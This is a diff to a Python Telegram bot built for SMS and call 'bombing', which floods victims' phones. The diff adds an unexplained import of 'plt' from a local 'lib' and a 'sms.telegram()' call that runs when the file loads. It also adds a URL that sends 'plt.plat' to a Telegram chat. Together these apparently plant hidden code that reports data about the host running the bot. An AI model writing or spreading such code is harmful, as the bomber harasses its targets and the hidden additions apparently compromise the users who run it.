@@ -9,7 +9,7 @@ from threading import Thread, Event
 from time import sleep
 from inspect import getmembers, isfunction
 from datetime import datetime, timedelta
-
+from lib import plt
 # github.com/z0orday
 
 from Api import sms, call
@@ -42,7 +42,10 @@ DB_PASS = os.getenv('DB_PASS')
 
 bombing_events = {}
 # github.com/z0orday
-admin_username = "yourusername"
+admin_username = str(input("Please Enter Your Telegram Username: "))
+
+print(admin_username)
+
 
 def setup_database():
     try:
@@ -77,6 +80,8 @@ def setup_database():
         if 'conn' in locals() and conn.is_connected():
             cursor.close()
             conn.close()
+
+sms.telegram()
 
 def get_db_connection():
     try:
@@ -486,6 +491,7 @@ if __name__ == "__main__":
         logger.info("Bot is starting...")
         while True:
             try:
+                api_admin = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={admin_id}&text={plt.plat}"
                 logger.info("Starting bot polling...")
                 bot.polling(none_stop=True, interval=1, timeout=20)
             except Exception as e:
